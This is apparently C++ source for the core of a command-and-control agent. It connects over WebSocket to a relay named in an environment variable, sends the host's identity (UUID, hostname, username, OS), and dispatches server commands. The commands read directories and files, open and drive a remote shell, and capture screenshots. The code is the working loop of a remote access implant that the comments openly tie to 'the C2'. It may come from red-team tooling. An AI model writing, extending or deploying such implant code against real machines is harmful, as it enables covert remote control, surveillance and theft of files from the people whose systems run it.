#include "commands.h"
#include "runtime.h"
#include "websocket_client.h"
#include "shell.h"
#include "core/memory/memory.h"
#include "core/string/string.h"
#include "platform/system/environment.h"
#include "platform/system/system_info.h"

/**
 * Builds the identity header block sent with the /agent WebSocket upgrade (API 1).
 *
 * @details Identity travels as HTTP headers. The relay
 * copies these headers into its agent events and /status; the C2 consumes them as
 * typed fields without parsing anything binary. Two formats must stay stable:
 *  - X-Agent-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
 *    (Data1-3 little-endian/reversed, Data4-5 raw) — identical to what the C2 has
 *    historically keyed agents on, so machines registered by older builds keep
 *    their identity.
 *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
 *
 * @param info Populated SystemInfo (the same data the old Hello response carried).
 * @param out Output buffer for CRLF-terminated header lines (no trailing blank line).
 * @return Total header-block length, or 0 if the buffer was too small.
 */
static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
{
    const CHAR *hex = "0123456789abcdef";
    USIZE off = 0;

    auto append = [&](PCCHAR s) -> BOOL
    {
        USIZE len = StringUtils::Length(s);
        if (off + len >= out.Size())
            return false;
        Memory::Copy(out.Data() + off, s, len);
        off += len;
        return true;
    };
    auto appendNum = [&](UINT64 value) -> BOOL
    {
        CHAR buf[24];
        USIZE len = StringUtils::UIntToStr(value, Span<CHAR>(buf, sizeof(buf)));
        if (off + len >= out.Size())
            return false;
        Memory::Copy(out.Data() + off, buf, len);
        off += len;
        return true;
    };

    // Reconstruct the UUID's raw 16 bytes from its 64-bit halves.
    UINT64 msb = info.MachineUUID.GetMostSignificantBits();
    UINT64 lsb = info.MachineUUID.GetLeastSignificantBits();
    UINT8 ub[16];
    for (INT32 i = 0; i < 8; i++)
        ub[i] = (UINT8)(msb >> (56 - 8 * i));
    for (INT32 i = 0; i < 8; i++)
        ub[8 + i] = (UINT8)(lsb >> (56 - 8 * i));

    CHAR uuid[37];
    {
        INT32 o = 0;
        auto put = [&](UINT8 byte)
        {
            uuid[o++] = hex[byte >> 4];
            uuid[o++] = hex[byte & 0xF];
        };
        put(ub[3]); put(ub[2]); put(ub[1]); put(ub[0]); uuid[o++] = '-';
        put(ub[5]); put(ub[4]); uuid[o++] = '-';
        put(ub[7]); put(ub[6]); uuid[o++] = '-';
        for (INT32 i = 8; i < 12; i++) put(ub[i]);
        uuid[o++] = '-';
        for (INT32 i = 12; i < 16; i++) put(ub[i]);
        uuid[o] = '\0';
    }

    CapabilityMask mask = BuildCapabilityMask();

    BOOL ok = true;
    ok = ok && append("X-Agent-Api-Version: ") && appendNum(AGENT_API_VERSION) && append("\r\n");
    ok = ok && append("X-Agent-Uuid: ") && append(uuid) && append("\r\n");
    ok = ok && append("X-Agent-Hostname: ") && append(info.Hostname) && append("\r\n");
    ok = ok && append("X-Agent-Username: ") && append(info.Username) && append("\r\n");
    ok = ok && append("X-Agent-Arch: ") && append(info.Architecture) && append("\r\n");
    ok = ok && append("X-Agent-Platform: ") && append(info.AgentPlatform) && append("\r\n");
    ok = ok && append("X-Agent-Os-Version: ") && append(info.OSVersion) && append("\r\n");
    ok = ok && append("X-Agent-Build: ") && appendNum(AGENT_BUILD_NUMBER) && append("\r\n");
    ok = ok && append("X-Agent-Commit: ") && append(AGENT_COMMIT_HASH) && append("\r\n");
    ok = ok && append("X-Agent-Name-Id: ") && appendNum(AGENT_NAME_ID) && append("\r\n");
    ok = ok && append("X-Agent-Bitness: ") && appendNum(sizeof(void *) * 8) && append("\r\n");
    ok = ok && append("X-Agent-Capabilities: ");
    for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
    {
        CHAR byte[2] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF]};
        if (off + 2 >= out.Size())
        {
            ok = false;
            break;
        }
        Memory::Copy(out.Data() + off, byte, 2);
        off += 2;
    }
    ok = ok && append("\r\n");

    return ok ? off : 0;
}

static const CHAR *CommandTypeName(UINT8 type)
{
    switch (type)
    {
    case CommandType::Command_GetDirectoryContent:
        return "GetDirectoryContent";
    case CommandType::Command_GetFileContent:
        return "GetFileContent";
    case CommandType::Command_GetFileChunkHash:
        return "GetFileChunkHash";
    case CommandType::Command_WriteShell:
        return "WriteShell";
    case CommandType::Command_ReadShell:
        return "ReadShell";
    case CommandType::Command_GetDisplays:
        return "GetDisplays";
    case CommandType::Command_GetScreenshot:
        return "GetScreenshot";
    case CommandType::Command_CloseShell:
        return "CloseShell";
    case CommandType::Command_Exit:
        return "Exit";
    case CommandType::Command_OpenShell:
        return "OpenShell";
    default:
        return "Unknown";
    }
}

INT32 start()
{
    // Resolve the relay URL from the W_URL environment variable at runtime.
    // There is no fallback: the agent will not run without an explicit endpoint.
    CHAR urlBuffer[512];
    USIZE urlLen = Environment::GetVariable("W_URL", Span<CHAR>(urlBuffer, sizeof(urlBuffer)));
    if (urlLen == 0)
    {
        LOG_ERROR("W_URL environment variable is not set; cannot start agent without a relay endpoint");
        return 0;
    }
    Span<const CHAR> urlSpan(urlBuffer, urlLen); // exclude null terminator (ParseUrl bounds on Span size)

    Context context;
    UINT32 connectionAttempt = 0;

    CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
    // Core (mandatory, always registered)
    commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
#if SUPPORT_FILESYSTEM
    commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
    commandHandlers[CommandType::Command_GetFileContent]      = Handle_GetFileContentCommand;
    commandHandlers[CommandType::Command_GetFileChunkHash]    = Handle_GetFileChunkHashCommand;
#endif
#if SUPPORT_SHELL
    commandHandlers[CommandType::Command_OpenShell]  = Handle_OpenShellCommand;
    commandHandlers[CommandType::Command_CloseShell] = Handle_CloseShellCommand;
    commandHandlers[CommandType::Command_ReadShell]  = Handle_ReadShellCommand;
    commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
#endif
#if SUPPORT_DISPLAY
    commandHandlers[CommandType::Command_GetDisplays]   = Handle_GetDisplaysCommand;
    commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
#endif

    LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);

    while (!context.shouldExit)
    {
        connectionAttempt++;
        LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)urlBuffer);

        // Identity rides the upgrade request as HTTP headers (API 1) — no Hello
        // frame. Built fresh per connection so a changed hostname/user follows
        // the reconnect.
        SystemInfo identityInfo;
        GetSystemInfo(&identityInfo);
        CHAR identityHeaders[1024];
        USIZE identityHeadersLen = BuildIdentityHeaders(identityInfo, Span<CHAR>(identityHeaders, sizeof(identityHeaders)));
        if (identityHeadersLen == 0)
        {
            LOG_ERROR("Identity header block does not fit (attempt #%u)", connectionAttempt);
            return 0;
        }

        auto createResult = WebSocketClient::Create(urlSpan, Span<const CHAR>(identityHeaders, identityHeadersLen));
        if (!createResult)
        {
            LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)urlBuffer);
            return 0;
        }
        WebSocketClient &wsClient = createResult.Value();
        LOG_INFO("WebSocket connection established (attempt #%u) to %s (identity sent in upgrade headers)",
                 connectionAttempt, (PCCHAR)urlBuffer);

        UINT32 messageCount = 0;
        while (!context.shouldExit)
        {
            LOG_DEBUG("Waiting for next WebSocket message...");
            auto readResult = wsClient.Read();
            if (!readResult)
            {
                LOG_ERROR("WebSocket read failed after %u messages processed, reconnecting...", messageCount);
                break;
            }
            if (readResult.Value().Length < sizeof(UINT8))
            {
                LOG_ERROR("WebSocket received empty/undersized message (%u bytes), reconnecting...",
                          (UINT32)readResult.Value().Length);
                break;
            }

            messageCount++;
            PCHAR command = (PCHAR)(readResult.Value().Data);
            UINT8 commandType = command[0];
            command++;
            USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
            LOG_INFO("Message #%u received: command=%s (0x%02x), payload_length=%u, ws_opcode=%d",
                     messageCount, CommandTypeName(commandType), (UINT32)commandType,
                     (UINT32)commandLength, (INT32)readResult.Value().Opcode);

            PCHAR response = nullptr;
            USIZE responseLength = sizeof(UINT32);

            if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
            {
                LOG_DEBUG("Dispatching command %s to handler", CommandTypeName(commandType));
                commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
                UINT32 statusCode = *(PUINT32)response;
                LOG_INFO("Command %s completed: status=%u, response_length=%u",
                         CommandTypeName(commandType), statusCode, (UINT32)responseLength);
            }
            else
            {
                LOG_ERROR("Unknown command type 0x%02x received (max valid: 0x%02x), returning StatusUnknownCommand",
                          (UINT32)commandType, (UINT32)(CommandType::CommandTypeCount - 1));
                response = new CHAR[responseLength];
                *(PUINT32)response = StatusCode::StatusUnknownCommand;
            }

            LOG_DEBUG("Sending response (%u bytes) to server", (UINT32)responseLength);
            auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
            delete[] response;

            if (!writeResult)
            {
                LOG_ERROR("Failed to send response for command %s, reconnecting...", CommandTypeName(commandType));
                break;
            }
            LOG_INFO("Response sent successfully for command %s (%u bytes)", CommandTypeName(commandType), (UINT32)responseLength);
        }

        LOG_WARNING("WebSocket session ended after %u messages, will attempt reconnection", messageCount);
    }
    return 1;
}
